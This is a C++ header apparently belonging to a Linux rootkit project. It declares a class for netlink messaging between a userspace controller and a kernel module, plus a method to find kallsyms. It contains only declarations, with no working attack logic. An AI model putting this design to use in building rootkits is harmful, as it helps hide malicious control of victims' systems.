#ifndef ROOTKIT_KERNEL_ACCESS_H
#define ROOTKIT_KERNEL_ACCESS_H

#include <linux/netlink.h>
#include <string>

#include "msg_to_module.h"
#include "msg_to_user.h"

#ifndef MODULE_DIR
#error module dir is not defined
#endif

#ifndef MODULE_NAME
#error module name is not defined
#endif

#define MODULE_EXT ""

#define NETLINK_USER 31

class kernel_access {
private:
    int sock_fd;
    struct sockaddr_nl dest_addr;

    unsigned long find_kallsyms();

public:
    msg_to_user my_recv_msg();
    void my_send_msg(msg_to_module);

    kernel_access();
    virtual ~kernel_access();

};

extern kernel_access kernelAccess;

#endif //ROOTKIT_KERNEL_ACCESS_H
